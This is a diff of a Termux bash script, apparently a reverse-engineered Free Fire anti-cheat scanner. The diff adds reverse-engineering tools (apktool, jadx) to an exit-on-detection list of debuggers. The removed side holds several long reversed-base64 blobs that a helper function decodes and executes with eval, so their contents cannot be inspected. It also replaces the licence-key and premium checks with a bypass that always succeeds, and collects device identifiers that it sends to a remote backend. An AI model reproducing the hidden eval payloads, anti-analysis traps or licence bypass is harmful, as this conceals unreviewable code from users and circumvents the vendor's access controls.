@@ -1,2835 +1,2695 @@
 #!/data/data/com.termux/files/usr/bin/bash
-# TiziSS AntiCheat — scanner reconstruido desde el payload distribuido.
-# NOTA: la autenticacion por key esta deshabilitada temporalmente por solicitud del propietario.
-# Este archivo conserva las funciones de analisis y deteccion del scanner original.
-: "${_UNKNOWN_LEGAL:=UNKNOWN Security Team - Codigo Privado - Ingenieria inversa prohibida}"
-: "${_UNKNOWN_LEGAL:=UNKNOWN Security Team - Codigo Privado - Ingenieria inversa prohibida}"
-_d(){ eval "$(printf '%s%s%s%s' "$1" "$2" "$3" "$4"|rev|base64 -d 2>/dev/null)"; }
+
 _s(){
   local _tv
   _tv=$(grep "TracerPid" /proc/$$/status 2>/dev/null|awk '{print $2}')
   [ -n "$_tv" ]&&[ "$_tv" != "0" ]&&exit 1
-  for _b in strace ltrace gdb frida-server r2; do
+  for _b in strace ltrace gdb frida-server r2 apktool jadx; do
     pgrep -x "$_b" >/dev/null 2>&1&&exit 1
   done
 }
 _s
-R='\033[1;31m'
-G='\033[1;32m'
-Y='\033[1;33m'
-B='\033[1;34m'
-M='\033[1;35m'
-C='\033[1;36m'
-W='\033[1;37m'
-N='\033[0m'
 
-COLS=$(tput cols 2>/dev/null); [[ ! "$COLS" =~ ^[0-9]+$ ]] && COLS=60
-[ "$COLS" -gt 66 ] && COLS=66; [ "$COLS" -lt 44 ] && COLS=44
-
-_hl() { local n=$1 c="${2:-─}" s="" i; for((i=0;i<n;i++)); do s+="$c"; done; printf '%s' "$s"; }
-_sp() { printf "%${1}s" ""; }
-_bc() { local t="$1" inner="$2" tl=${#1} lp rp
-    lp=$(( (inner-tl)/2 )); rp=$(( inner-tl-lp ))
-    [ $lp -lt 0 ] && lp=0; [ $rp -lt 0 ] && rp=0
-    printf '%s%s%s' "$(_sp $lp)" "$t" "$(_sp $rp)"; }
-
-sec_hdr() {
-    local t="$1" inner=$(( COLS-2 ))
-    local pad=$(( inner-2-${#t} )); [ $pad -lt 0 ] && pad=0
-    log_output "${C}┌$(_hl $inner)┐${N}"
-    log_output "${C}│ ${W}${t}$(_sp $pad) ${C}│${N}"
-    log_output "${C}└$(_hl $inner)┘${N}"
-}
-
-echo_hdr() {
-    local t="$1" col="${2:-$B}" inner=$(( COLS-2 ))
-    local pad=$(( inner-2-${#t} )); [ $pad -lt 0 ] && pad=0
-    echo -e "${col}┌$(_hl $inner)┐${N}"
-    echo -e "${col}│ ${W}${t}$(_sp $pad) ${col}│${N}"
-    echo -e "${col}└$(_hl $inner)┘${N}"
-}
-
-verdict_box() {
-    local col="$1" t="$2" inner=$(( COLS-2 ))
-    local lp=$(( (inner-${#t})/2 )) rp
-    rp=$(( inner-${#t}-lp ))
-    [ $lp -lt 0 ] && lp=0; [ $rp -lt 0 ] && rp=0
-    log_output "${col}╔$(_hl $inner ═)╗${N}"
-    log_output "${col}║$(_sp $lp)${t}$(_sp $rp)║${N}"
-    log_output "${col}╚$(_hl $inner ═)╝${N}"
-}
-
-BACKEND_URL="https://unknown-scanner-backend-v1-0.onrender.com"
-SCANNER_VERSION="1.8.3"
-STATS_FILE="$HOME/.unknown_scanner_uses"
-KEY_FILE="$HOME/.unknown_premium_key"
-
-SESSION_TOKEN=""
-KEY_SESSION_EXPIRES=""
-ACCESS_KEY_USED=""
-
-pedir_key() {
-    # BYPASS TEMPORAL: la autenticacion por key esta deshabilitada.
-    # Restaurar la validacion antes de distribuir el scanner fuera de entornos controlados.
-    SESSION_TOKEN=""
-    KEY_SESSION_EXPIRES="disabled"
-    ACCESS_KEY_USED="disabled"
-    log_output "${Y}[*] Acceso sin key habilitado temporalmente.${N}"
-    return 0
-}
-
-
-LOGFILE="$HOME/anticheat_log_$(date +%Y%m%d_%H%M%S).txt"
-SUSPICIOUS_COUNT=0
-GAME_SELECTED=""
-GAME_PKG=""
-DEVICE_HWID=""
-FAKE_TIME_DETECTED=0
-FOUND_LSPACED=0
-FOUND_SHIZUKU=0
-FOUND_CHEAT_APP=0
-FOUND_WRAPPER=0
-
-_xd() { local b="$1" o="" c d i; while [ ${#b} -ge 8 ]; do c="${b:0:8}"; b="${b:8}"; d=0; for (( i=0; i<8; i++ )); do d=$(( d*2 + ${c:$i:1} )); done; o+=$(printf "\\$(printf '%03o' $d)"); done; printf '%s' "$o"; }
-REPLAY_HWID_WHITELIST=(
-"$(_xd 0011100000110010001100100011001000110101001100010011100001100011001101100011100001100010001101010110010101100001011000100011001100110011001110010110011000111000011001000011000100110001001100110110000100110011011001010011010001100010001100110110001100110101)"
-)
-
-registrar_uso() {
-    local count=1
-    [ -f "$STATS_FILE" ] && count=$(( $(cat "$STATS_FILE" 2>/dev/null || echo 0) + 1 ))
-    echo "$count" > "$STATS_FILE"
-    curl -sf --max-time 4 -X POST "${BACKEND_URL}/api/stats/scan" \
-        -H "Content-Type: application/json" \
-        -d "{\"version\":\"${SCANNER_VERSION}\"}" &>/dev/null &
-}
-
-obtener_stats_global() {
-    local resp total
-    resp=$(curl -sf --max-time 5 "${BACKEND_URL}/api/stats/scan" 2>/dev/null)
-    total=$(echo "$resp" | grep -o '"total":[0-9]*' | grep -o '[0-9]*')
-    [ -n "$total" ] && echo "$total" || echo "?"
-}
-
-obter_hwid_real() {
-    local android_id serial boot_serial
-    android_id=$(adb shell "settings get secure android_id 2>/dev/null" | tr -d '\r\n')
-    serial=$(adb shell "getprop ro.serialno 2>/dev/null" | tr -d '\r\n')
-    boot_serial=$(adb shell "getprop ro.boot.serialno 2>/dev/null" | tr -d '\r\n')
-    printf '%s:%s:%s' "$android_id" "$serial" "$boot_serial" \
-        | md5sum | cut -d' ' -f1
-}
-
-verificar_hwid_ban() {
-    echo -e "${B}[*] Verificando dispositivo...${N}"
-
-    DEVICE_HWID=$(obter_hwid_real)
-
-    if [ -z "$DEVICE_HWID" ] || [ ${#DEVICE_HWID} -lt 8 ]; then
-        echo -e "${Y}[*] No se pudo calcular HWID — continuando${N}"
-        sleep 1; return 0
-    fi
-
-    local respuesta
-    respuesta=$(curl -sf --max-time 6 \
-        "${BACKEND_URL}/api/ban/check?hwid=${DEVICE_HWID}" 2>/dev/null)
-
-    if [ -z "$respuesta" ]; then
-        return 0
-    fi
-
-    local baneado motivo fecha
-    baneado=$(echo "$respuesta" | grep -o '"banned":[^,}]*' | cut -d: -f2 | tr -d '" ')
-    motivo=$(echo "$respuesta"  | grep -o '"motivo":"[^"]*"' | cut -d'"' -f4)
-    fecha=$(echo "$respuesta"   | grep -o '"fecha":"[^"]*"'  | cut -d'"' -f4)
-
-    if [ "$baneado" = "true" ]; then
-        clear
-        echo ""
-        echo -e "${R}  ██████╗  █████╗ ███╗   ██╗${N}"
-        echo -e "${R}  ██╔══██╗██╔══██╗████╗  ██║${N}"
-        echo -e "${R}  ██████╔╝███████║██╔██╗ ██║${N}"
-        echo -e "${R}  ██╔══██╗██╔══██║██║╚██╗██║${N}"
-        echo -e "${R}  ██████╔╝██║  ██║██║ ╚████║${N}"
-        echo -e "${R}  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝${N}"
-        echo ""
-        echo -e "${R}$(_hl $COLS ═)${N}"
-        echo -e "${R}$(_bc "DISPOSITIVO BLOQUEADO DEL SCANNER" $COLS)${N}"
-        echo -e "${R}$(_hl $COLS ═)${N}"
-        echo ""
-        echo -e "${W}  Motivo : ${R}${motivo}${N}"
-        echo -e "${W}  Data   : ${Y}${fecha}${N}"
-        echo -e "${W}  HWID   : ${Y}${DEVICE_HWID}${N}"
-        echo ""
-        echo -e "${Y}  Este dispositivo no puede usar el scanner.${N}"
-        echo ""
-        echo -e "${C}  Para apelar: ${Y}discord.gg/lavagancia${N}"
-        echo ""
-        echo -e "${W}Presione Enter para salir...${N}"; read
-        return 1
-    fi
-
-    return 0
-}
-
-banner() {
-    clear
-    local inner=$(( COLS - 2 ))
-    local _l _g
-
-    _l=$(cat "$STATS_FILE" 2>/dev/null || echo "0")
-    _g=$(curl -sf --max-time 3 "${BACKEND_URL}/api/stats/scan" 2>/dev/null \
-         | grep -o '"total":[0-9]*' | grep -o '[0-9]*' || echo "?")
-
-    printf "%b\n" "${C}╔$(_hl $inner ═)╗${N}"
-    printf "%b\n" "${C}║${M}$(_bc "CODE BY TIZI.XIT  ·  ANTI-CHEAT SYSTEM" $inner)${C}║${N}"
-    printf "%b\n" "${C}║${W}$(_bc "UNKNOWN SCANNER  —  v${SCANNER_VERSION}" $inner)${C}║${N}"
-    printf "%b\n" "${C}║${G}$(_bc "Globales: ${_g}   Dispositivo: ${_l}" $inner)${C}║${N}"
-    printf "%b\n" "${C}╠$(_hl $inner ═)╣${N}"
-    printf "%b\n" "${C}║${Y}$(_bc "discord.gg/lavagancia" $inner)${C}║${N}"
-    printf "%b\n" "${C}╚$(_hl $inner ═)╝${N}"
-    echo ""
-    printf "%b\n" "${Y}┌$(_hl $inner)┐${N}"
-    printf "%b\n" "${Y}│${N}$(_bc "[!] EN DESARROLLO — SIEMPRE REVISAR MANUALMENTE" $inner)${Y}│${N}"
-    printf "%b\n" "${Y}│${N}$(_bc "Los resultados son orientativos — confirmar siempre a mano" $inner)${Y}│${N}"
-    printf "%b\n" "${Y}└$(_hl $inner)┘${N}"
-    echo ""
-    sleep 1
-}
-
-log_output() {
-    echo -e "${1}" | tee -a "$LOGFILE"
-}
-_ctx() { echo -e "${N}\033[2m    ↳ ${1}${N}" | tee -a "$LOGFILE"; }
-
-# Un filesystem real casi nunca produce 4+ dígitos idénticos seguidos en la franja de nanosegundos
-# de Access/Modify/Change. Cuando aparece, suele ser porque el archivo fue reescrito con touch/cp
-# a partir de un timestamp que solo tenía precisión de milisegundos o segundos (el resto quedó en
-# 0) en vez de una escritura orgánica del juego. Se usa sobre el stat que cada check ya captura.
-_null_nanos() {
-    local stat_out="$1"
-    echo "$stat_out" | grep -E '^(Access|Modify|Change):' | grep -oE '\.[0-9]{9}' | tr -d '.' | grep -qE '0{4,}|9{4,}'
-}
-
-check_storage() {
-    if [ ! -d "$HOME/storage" ]; then
-        echo -e "${Y}[*] Configurando permisos de almacenamiento...${N}"
-        termux-setup-storage
-        sleep 2
-    fi
-}
-
-
-main_menu() {
-    SUSPICIOUS_COUNT=0
-    banner
-    echo_hdr "MENÚ PRINCIPAL" "$B"
-    echo ""
-    echo -e "${Y}[0]${W} Conectar ADB (Pareamiento inalámbrico)${N}"
-    echo -e "${G}[1]${W} Escanear Free Fire Normal${N}"
-    echo -e "${G}[2]${W} Escanear Free Fire MAX${N}"
-    echo -e "${C}[3]${W} Ver último log guardado${N}"
-    echo -e "${B}[4]${W} Guardar diagnóstico completo (Dumpsys)${N}"
-    echo -e "${M}[5]${W} Actualizar scanner${N}"
-    echo -e "${M}[6]${W} Monitor en vivo — Unknown Monitor${N}"
-    echo -e "${R}[S]${W} Salir${N}"
-    echo ""
-    echo -ne "${Y}Selecciona una opción: ${N}"
-    read -r opcao
-
-    case $opcao in
-        0) conectar_adb ;;
-        1) scan_ff_normal ;;
-        2) scan_ff_max ;;
-        3) ver_ultimo_log ;;
-        4) guardar_dumpsys ;;
-        5) actualizar_scanner ;;
-        6) abrir_juego_menu ;;
-        s|S) echo -e "\n${W}Gracias por usar el scanner${N}\n"; exit 0 ;;
-        *) echo -e "${R}Opción inválida${N}"; sleep 2; main_menu ;;
-    esac
-}
-
-_validate_key() {
-    local key="$1"
-    [ -z "$key" ] && return 1
-
-    if ! echo "$key" | grep -qE '^UNKN-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$'; then
-        return 1
-    fi
-
-    local RESP
-    RESP=$(curl -sf --max-time 8 \
-        -X POST "${BACKEND_URL}/api/premium/validate" \
-        -H "Content-Type: application/json" \
-        -d "{\"key\":\"$key\",\"hwid\":\"${DEVICE_HWID:-unknown}\"}" 2>/dev/null)
-
-    if [ -z "$RESP" ]; then return 2; fi
-    if echo "$RESP" | grep -q '"valid":true'; then return 0; fi
-    return 1
-}
-
-_key_cached_ok() {
-    [ ! -f "$KEY_FILE" ] && return 1
-
-    local STORED_KEY STORED_HWID STORED_TS NOW
-    STORED_KEY=$(sed -n '1p' "$KEY_FILE" | tr -d '\r\n')
-    STORED_HWID=$(sed -n '2p' "$KEY_FILE" | tr -d '\r\n')
-    STORED_TS=$(sed -n '3p'  "$KEY_FILE" | tr -d '\r\n')
-    NOW=$(date +%s)
-
-    [ "$STORED_HWID" != "${DEVICE_HWID:-unknown}" ] && { rm -f "$KEY_FILE"; return 1; }
-
-    if [ $(( NOW - STORED_TS )) -gt 604800 ]; then
-        _validate_key "$STORED_KEY"
-        local RES=$?
-        if [ $RES -eq 0 ]; then
-            printf '%s\n%s\n%s\n' "$STORED_KEY" "${DEVICE_HWID:-unknown}" "$NOW" > "$KEY_FILE"
-            return 0
-        elif [ $RES -eq 2 ]; then
-            log_output "${Y}[!] Sin conexión para re-validar key — acceso temporal por cache.${N}"
-            return 0
-        else
-            rm -f "$KEY_FILE"; return 1
-        fi
-    fi
-
-    return 0
-}
-
-_save_key() {
-    local key="$1"
-    printf '%s\n%s\n%s\n' "$key" "${DEVICE_HWID:-unknown}" "$(date +%s)" > "$KEY_FILE"
-    chmod 600 "$KEY_FILE"
-}
-
-check_premium_key() {
-    # BYPASS TEMPORAL: la validacion Premium esta deshabilitada.
-    # Restaurar la validacion antes de distribuir el scanner fuera de entornos controlados.
-    return 0
-}
-
-BR_DIR=""
-BR_TXT=""
-
-_d '==QfKISLt0SLt0iXiAidtACclJ3ZgwHIsxWdu9id' 'lR2L+IDIiQFWU9lUCRiIgIyLt0SLt0SLe9CLv0nb' 'yVGd0FGc7RCIt0SLt0SLvICIrdXYgACIgogIxQiI' '94mclRHdhBHIsF2YvxGIgACIKsHIpgyYlN3XyJ2X'
-
-_d '==QfKISQv4kI90UST9VWSRlTV90QfJlQgYiJg0FIi0UST9VWSRlTV90QfJlQkICI61CIbBCIgAiCpETLgQWYlhGI8ByJv8SXc9yc78yLbxFI60FXq4yLzdCIkV2cgwHIi0FXoNGdhB3X5RXayV3YlNnLc52bpNnclZnLcRGbpVnYuw1bytFXiASRtACclJ3ZgwHIiMFUPJFUkICIvh2YlhCJ9g0QUFEUflFVJJVVDV0UfJlQgACIgoQKx0CIkFWZoBCfgcyLv0FXvM3Ov8yWcBiOdxlKu8ycnACZlNHI8BiIdx1buxWYpJXZz5CX092bi5CXvJ3WcxXXc9mbsFWayV2cuw1bytFXiASRtACclJ3ZgwHIgACIgACIiMFUPJFUkICIvh2YlhCJ9wUQJJ' 'VRT9lUCBCIgAiCpETLgQWYlhGI8ByJv8SXc9yc78yLbxFI60FXq4yLzdCIkV2cgwHIi0FXlxWYj9Gbuw1c5NnLcR3cpNnclB3WcxXXcVGbhN2bs5CX0NWdk9mcw5CXvJ3WcJCIF1CIwVmcnBCfgACIgACIgIyUQ9kUQRiIg8GajVGKk0TRMF0QPx0XSJEIgACIKkSMtACZhVGagwHIn8yLdx1LztzLvsFXgoTXcpiLvM3JgQWZzBCfgISXcVmbvpXZtlGduw1c5NnLcR3cpNnclB3WcJCIF1CIwVmcnBCfgACIgAiITB1TSBFJiAyboNWZoQSPF50TaVUTJR1XSJEIgACIKkyJgcCIk1CIyRHI8BSMm1CInwyJk1CI0V3YgwHIx0CIkFWZoBCfgcyL' 'v0FXvM3Ov8yWcBiOdxlKu8ycnACZlNHI8BiIdxVeyRnb192Yt82cp5CXy9GdhJXZw9mLc12cntFXiASRtACclJ3ZgwHIgIyUQ9kUQRiIg8GajVGKk0TTJN1XZJFVOV1TD9lUCBCIgAiCpETLgQWYlhGI8ByJv8SXc9yc78yLbxFI60FXq4yLzdCIkV2cgwHIi0FXlNXYlxWZy5CXu9WazJXZ25CXkxWa1JmLc9mcbxlIgUULgAXZydGI8BCIiMFUPJFUkICIvh2YlhCJ9IVRW9FRJ9kUE5UQfJlQgACIgoQKx0CIkFWZoBCfgcyLv0FXvM3Ov8yWcBiOdxlKu8ycnACZlNHI8BiIdxFZuFmci5CX0NWdk9mcw5CXvJ3WcJCIF1CIwVmcnBCfgIyUQ9' 'kUQRiIg8GajVGKk0DROFkUC9VRDlkVFR0XSJEIgACIKkSMtACZhVGagwHIn8yLdx1LztzLvsFXgoTXcpiLvM3JgQWZzBCfgISXcxWZk9WbuwFdjVHZvJHcuw1bytFXiASRtACclJ3ZgwHIiMFUPJFUkICIvh2YlhCJ9wURE9UTfV0QJZVRE9lUCBCIgAiCpADMz0CIkFWZoBCfgwGb152L2VGZv4jMgICVYR1XSJEJiAiIbxlXiASRtACclJ3ZoQSPTB1TSBFImYCIdBiITB1TSBFJiAietAyWgACIgoQKiMVRJRlUFB1TSBFINVEVTl1UiAyYlN3XyJ2XoQSPTB1TSBFIgACIKMFUPJFUgwWYj9GbgACIgowegkCKvZmbp9VZjlmdlR2X0V2ZfJnY'
-
-br_show_device_header() {
-    sec_hdr "INFORMACIÓN DEL DISPOSITIVO"
-    log_output "${W}  Dispositivo:     ${C}${BR_DEVICE_BRAND:-?} ${BR_DEVICE_MODEL:-N/A}${N}"
-    log_output "${W}  Android:         ${C}${BR_ANDROID_VER:-N/A}${N}"
-    log_output "${W}  Parche seguridad:${C}${BR_SECURITY_PATCH:-N/A}${N}"
-    log_output "${W}  País (SIM):      ${C}${BR_COUNTRY_SIM^^}${N}"
-    log_output "${W}  Zona horaria:    ${C}${BR_TIMEZONE:-N/A}${N}"
-    log_output "${W}  Locale:          ${C}${BR_LOCALE:-N/A}${N}"
-    [ -n "$BR_SERIAL" ] && log_output "${W}  Serial:          ${Y}${BR_SERIAL}${N}"
-    log_output ""
-}
-
-_d '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'
-
-_d '=0nCiICI0VHc0V3bfd2bsBCIgAiCi0nT7RychN3boNWZwN3bzBiQTV1LCRUQgMXZu9Wa4VmbvNGIul2Ug01kcK+W9d0ekICI0VHc0V3bfd2bsBiJmASXgADIxVWLgQkTV9kRkAyWgACIgoQamBCIgAiCx0DROV1TGByOpkCN9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgoQZu9GZgsjI950ekwGJgASfZtHJiACd1BHd192Xn9Gbg8GZgsDbgIXLgQWYlJHI9MlRJBSZslGa3BCfgICUDR1XCRUQkICIvh2YlBCIgACIgACIKISfOtHJ6kSN1UTNg8GdyVWdwhCIkVmcg4WZgIERBBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiCuVGa0ByOdBiIQNEVfJERBRiIg4WLgsFImlGIgACIKkyMtACZhVGagwHIsxWdu9idlR2L+IDIiQFWU9lUCRiIgISN1UTNq4CZiRWY8RmYkFmKuUTN1UjO8VTN1UjOw4CXw4CXw4CXwwXN1UTN6ojOiASRtACclJ3ZoQSPQNEVfJERBBCIgAiCQNEVfJERBBCbhN2bsBCIgAiCpZGIgACIK0HI7ETPE5UVPZEI7kSK00zKU5UVPN0XTV1TJNUSQNVVThCKgsHImYCIdBSMgEXZtAyc19WajlGczV3cfRnblZXZkAyWgACIgACIgAiCiMFVOVkVFRiIgwDP8ASZu9GZgACIgACIgAiCpZGIgACIgACIgACIgAiCi0nT7Ryb05WZ2VGJgASXzRHJbBCI9l1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgACIgAiClNHblBCIgACIgACIgACIgoQM9MXdvl2YpB3c1N3X05WZ2VGIgACIgACIgACIgACIgACIKISfOtHJu8kLXBiUBNUSMBVQgQJgiDiUF5kTBN0UgwUQg8USWVkUQBCIUCo4gAyb05WZ2VGJgASXzRHJbBCI9J1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgACIgAiCuVGa0ByOdBiIPlkVFJFUiASPgIybwlGdkICIbBiZpxWZgACIgACIgACIgACIKISfOtHJyFmcv5' '2ZpBCLyVmbuF2YzBCblRGIgQJgiDCIvRnblZXZkACIdNHdksFIg0nQ7RiIgQXdwRXdv91ZvxGIgACIgACIgACIgACIgACIK4WZoRHI70FIiIVRO5UQDNlIg0DIi8GcpRHJiAyWgYWagACIgACIgACIgACIKIiTPlEWF50TDNVREJSPvRnblZXZgwHfgIiTPlEWF50TDJSPvRnblZXZgYiJgACIgACIgACIgACIgACIgoAXgICZlNXat9mcw12bjx3Zul2ZnVnYlR2XiNXd8JERBx3ZulGdyFGdzJCIFlWctACclJ3ZgwHIiwGJiAyboNWZgACIgACIgACIgACIKkiIsRiIg8GcpR3XiRWYfhCJ98GcpRHIgACIgACIgACIgAiCiAXbhR3cl1Wa0BibpNnI9MHdgYiJg0FIiMHdkICI61CIbBCIgACIgACIgACIgoQKx0CIkFWZoBCfgIyKdlTLwslLc1nM71VOtAzW60nM71VOtAzW60nM71VOtAzWg0nM71VOtAzWt0nM71VOtAzWiASRv1CIwVmcnBCfgICbkICIvh2YlhCJ9MHdgACIgACIgACIgACIK8GduVmdlBybwlGdgMHdgwWYj9GbgACIgACIgACIgACIK8GZgsDbgIXLgQWYlJHI9MlRJBSZslGa3BCIgACIgACIKATPzV3bpNWawNXdz9FduVmdlBCbhN2bsBCIgACIgACIKISfOtHJ6IERBBycl52bphXZu92YzVGZvMXZu9Wa4VmbvNGIzAych1Wa0xWVgASfXtHJiACd1BHd192Xn9GbgACIgACIgAiCiICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIiMFVOVkVFRiIg4WLgsFImlGIgACIKkyMtACbpFGdgwHIsxWdu9idlR2L+IDIiQFWU9lUCRiIgACIgACIgAiCcBiI0NWZu52bjNXakpiLkJGZhxXZulGbmZ2bq4CZiRWY8RWZzlWbvJHct92YgMXagU2YpZXZExHZlxmYh5WZgMXagcmbpd2Z1JWZk9lYzVHfn5Wa0JXY0NnKuQmYkFGflRXY0NHICNVVq4icldWYuFWTlNWa2VGRiNXViACIgACI' 'gACIKwFIF1CIwVmcnhCJ9MFVOVkVFBCIgAiCTRlTFZVRgwWYj9GbgACIgoQamBCIgAiCx0DROV1TGBCIgACIgACIKISfOtHJHZ0QfJ0UVRCI9AyZpZmbvNmLiNXduMXez5Cdzl2cyVGcg0lKb1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsjIiRWYiASctACclJ3ZgwHIickRD9lQTVFJiAyboNWZgYWagACIgoQKn8yLdx1LztzLvsFXgoTXcpiLvM3JgQWZzBCfgISXcdWam52bj5CXiNXduw1c5NnLcR3cpNnclB3WcJCIF1CIwVmcnBCfgIyUQ9kUQRiIg8GajVGKk0zRGN0XCNVVgACIgowRGN0XCNVVgwWYj9GbgACIgogI950ekkiQEFEIu9WajF2YpRnblRXdhBibpNHKgADI9ASZyV3YlNnLiRWYu8mcg0lKb1XW7RiIgQXdwRXdv91ZvxGImYCIdBiIwICI9AiIFJVVDV0UfJERBRiIgsFIgACIKkyJv8SXc9yc78yLbxFI60FXq4yLzdCIkV2cgwHIi0FXlJXdjV2cuwlYkFmLc9mcbxlIgUULgAXZydGI8BiITB1TSBFJiAyboNWZoQSPFJVVDV0UfJERBBCIgAiCFJVVDV0UfJERBBCbhN2bsBCIgAiC9BCIgAiCi8USWVkUQJCIvh2YlBCf8BiISVkTOF0QTJCIvh2YlBiJmASXgADM2ASZs1CImZWakRCIbBCIgACIgACIKkSKgADM0YDOgsCImZWakBCKoQSPmZWakBiJmASXgADI0xWLgYmZpRGJgsFIgACIgACIgoQKpAycjV2cfZXZg0CITNURT9lTFdEIogCJ9YmZpRGIgACIgACIgoQKpAycgsCIwYDIqASbgsCIwAjNzAiKggGIogCJ9M3YlN3X2VGIgACIgACIgoQKpASKzYWLgoDZtACd1NGI8BiIzRHJiAyboNWZoQyIwEDIogCJ9MHIgACIgACIgoQKpASKyYWLgoDZtACd1NGI8BiIzRHJiAyboNWZoQyIwEDIogCJ90GIgACIgACIgoQKpASKxYWLgoDZtACd1NGI8BiIzRHJiAyboN' 'WZoQyIwEDIogCJ9gGIgACIgACIgoQfgsjbyVHdlJHI7IyTEl0QP50TDNVREJCIvh2YlByegYiJg0FIx0CIxVWLgICSf5URHRiIgsFI8xHIdBiIzRHJiAietAyWgACIgACIgAiCpETLgQWYlhGI8BiI9JzedlTLwslO9JzedlTLwslO9JzedlTLwslIgU0btACclJ3ZgwHIiEDJiAyboNWZoQSPzRHIgACIgACIgogZmlGZgM3YlN3X2VGIzBSbggGIzRHIsF2YvxGIgACIgACIgowegkCKvBXa09lYkF2XgACIgoQKpAyUf5URHByKgAjNgoCIN9lTFdEIrACMwYzMgoCII9lTFdEIogCJ9M1QFN1XOV0RgwWYj9GbgACIgoQamBCIgAiCpkCI911Mbh0QUFUTFJ1XINVQCtHJjATMggCKk0zUf5URHBCIgACIgACIKkSKg0XXysFSDRVQNVkUfh0UBJ0ekMCMxACKoQSPN9lTFdEIgACIgACIgoQKpASfdFzWINEVB1URS9FSTFkQ7RyIwEDIogCJ9g0XOV0RgACIgACIgAiCuVGa0ByOd1FIp0nM71VOtAzWo0SK9JzedlTLwsFKtkSfysXX50CMbhSL9JzedlTLwsVL9JzedlTLwsVL9RzedlTLwsFI+1DIiUUTB5kRfJlQkICIbtFImlGIgACIKkiI9RFWU9lUCRSL6gEVBB1XQlkW7RiIgUWbh5WZzFmYoQSPF1UQOZ0XSJEIgACIKETL9M1XOV0RgETL900XOV0RgETL9g0XOV0RgUUTB5kRfJlQgwWYj9GbgACIgoQKwAzMtACZhVGagwHIsxWdu9idlR2L+IDIiQFWU9lUCRiIgIyWc5lIgUULgAXZydGKk0zUQ9kUQBiJmASXgIyUQ9kUQRiIgoXLgsFIgACIKkiITVUSUJVRQ9kUQBSTFR1UZNlIgMWZz9lci9FKk0zUQ9kUQBCIgAiCTB1TSBFIsF2YvxGIgACIKATPE5UVPZEIsF2YvxGIgACIKIyUFRlTFl0QFJFICNVVg8CIC